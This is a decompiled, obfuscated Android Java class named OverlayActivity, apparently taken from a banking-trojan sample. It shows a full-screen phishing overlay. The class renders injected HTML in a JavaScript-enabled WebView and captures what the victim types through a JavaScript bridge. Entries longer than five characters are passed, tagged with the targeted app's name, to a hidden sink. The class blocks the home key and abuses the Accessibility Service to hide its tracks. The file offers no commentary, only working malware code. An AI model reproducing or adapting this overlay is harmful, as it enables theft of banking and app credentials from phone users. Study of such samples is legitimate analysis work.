package com.mistral.jon.overlay;

import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.RelativeLayout;
import androidx.appcompat.app.AppCompatActivity;
import p001z.ayp;
import p001z.azk;
import p001z.bbd;
import p001z.bcq;
import p001z.bcw;
import p001z.bdl;
import p001z.bdm;
import p001z.bdq;

/* JADX INFO: loaded from: classes.dex */
public final class OverlayActivity extends AppCompatActivity {

    /* JADX INFO: renamed from: a */
    private static long[] f741a = {1904631557, 447119258, 2095744682, 1506883705, 770107448};

    /* JADX INFO: renamed from: a */
    public static final C0124a aVar = new C0124a(null);

    public static final class WebAppInterface {

        /* JADX INFO: renamed from: a */
        private static long[] f742a = {2528125, 316889098};

        /* JADX INFO: renamed from: a */
        private final AppCompatActivity appCompatActivity;

        /* JADX INFO: renamed from: a */
        private final String str;

        public WebAppInterface(AppCompatActivity appCompatActivity, String str) {
            bdm.m4600b(appCompatActivity, "");
            this.appCompatActivity = appCompatActivity;
            this.str = str;
        }

        @JavascriptInterface
        /* JADX INFO: renamed from: s */
        public final void m1058s(String str) {
            bdm.m4600b(str, "");
            Log.e(bcw.getStr(), str);
            if (bdq.m4602a(str).toString().length() > 5) {
                ayp.m4254a().m4264b(this.str + ": " + str);
                new bbd(bcq.m4272a(this.appCompatActivity)).m4453a(this.str);
            }
            this.appCompatActivity.finish();
            this.appCompatActivity.overridePendingTransition(0, 0);
            azk.getAccessibilityService().performGlobalAction(2);
        }
    }

    /* JADX INFO: renamed from: com.mistral.jon.overlay.OverlayActivity$a */
    public static final class C0124a {
        private C0124a() {
        }

        public /* synthetic */ C0124a(bdl bdlVar) {
            this();
        }
    }

    @Override // androidx.activity.ComponentActivity, android.app.Activity
    public void onBackPressed() {
        super.onBackPressed();
        finish();
        overridePendingTransition(0, 0);
        azk.getAccessibilityService().performGlobalAction(2);
    }

    /* JADX WARN: Multi-variable type inference failed */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        overridePendingTransition(0, 0);
        String str1 = getIntent().getStringExtra("p");
        String str2 = getIntent().getStringExtra("h");
        WebAppInterface webAppInterface = new WebAppInterface(this, str1);
        WebView webView = new WebView(this);
        webView.setLayoutParams(new RelativeLayout.LayoutParams(-1, -1));
        WebSettings webSettings = webView.getSettings();
        bdm.m4598a(webSettings, "");
        webSettings.setJavaScriptEnabled(true);
        webView.setScrollBarStyle(0);
        webView.addJavascriptInterface(webAppInterface, "I");
        if (str2 != null) {
            webView.loadData(str2, "text/html; charset=utf-8", "UTF-8");
        }
        setContentView(webView);
    }

    /* JADX WARN: Multi-variable type inference failed */
    @Override // androidx.appcompat.app.AppCompatActivity, android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent event) {
        bdm.m4600b(event, "");
        if (i == 3) {
            return true;
        }
        if (i != 4 && i != 82) {
            return false;
        }
        long j = 447119258;
        return true;
    }

    @Override // androidx.fragment.app.FragmentActivity, android.app.Activity
    public void onPause() {
        super.onPause();
        overridePendingTransition(0, 0);
    }
}
